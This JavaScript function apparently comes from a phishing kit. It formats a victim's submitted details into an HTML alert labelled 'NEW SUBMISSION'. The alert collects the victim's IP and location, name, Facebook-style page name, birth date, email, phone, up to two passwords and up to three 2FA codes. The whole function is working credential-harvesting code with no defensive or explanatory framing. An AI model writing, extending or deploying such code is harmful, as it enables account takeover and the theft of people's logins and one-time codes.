function buildMessage(data, ipInfo = {}) {
    const c = (val) => (val !== undefined && val !== null && val !== '') ? `<code>${val}</code>` : '<i>N/A</i>';
    const dob = (data.day && data.month && data.year)
      ? `${data.day}/${data.month}/${data.year}` : '';

    const ip       = ipInfo.ip           || 'N/A';
    const city     = ipInfo.city         || '';
    const regCode  = ipInfo.region_code  || '';
    const country  = ipInfo.country_name || '';
    const countryC = ipInfo.country_code || '';

    // "Hanoi, Hanoi, Vietnam (VN)"
    const parts = [];
    if (city)                         parts.push(city);
    if (regCode && regCode !== city)  parts.push(regCode);
    if (country)                      parts.push(country);
    const locationReadable = parts.join(', ') + (countryC ? ` (${countryC})` : '');

    const lines = [];

    lines.push(`🌐 <b>IP:</b> <code>${ip}</code>`);
    lines.push(`📍 <b>Location:</b> <code>${locationReadable}</code>`);
    lines.push(`🔔 <b>NEW SUBMISSION</b>`);
    lines.push(`-----------------------------`);
    lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
    lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
    lines.push(`<b>Date of Birth:</b> ${c(dob)}`);
    lines.push(`<b>Message:</b> ${c(data.message)}`);
    lines.push(`-----------------------------`);
    lines.push(`<b>Email:</b> ${c(data.email)}`);
    lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
    lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
    lines.push(`-----------------------------`);
    if (data.password)       lines.push(`🔑 <b>Password (1):</b> ${c(data.password)}`);
    if (data.passwordSecond) lines.push(`🔑 <b>Password (2):</b> ${c(data.passwordSecond)}`);
    lines.push(`-----------------------------`);
    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA (1):</b> ${c(data.twoFa)}`);
    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA (2):</b> ${c(data.twoFaSecond)}`);
    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA (3):</b> ${c(data.twoFaThird)}`);
    lines.push(`-----------------------------`);
    lines.push(`🕐 ${new Date().toLocaleString('vi-VN')}`);

    return lines.join('\n');
  }
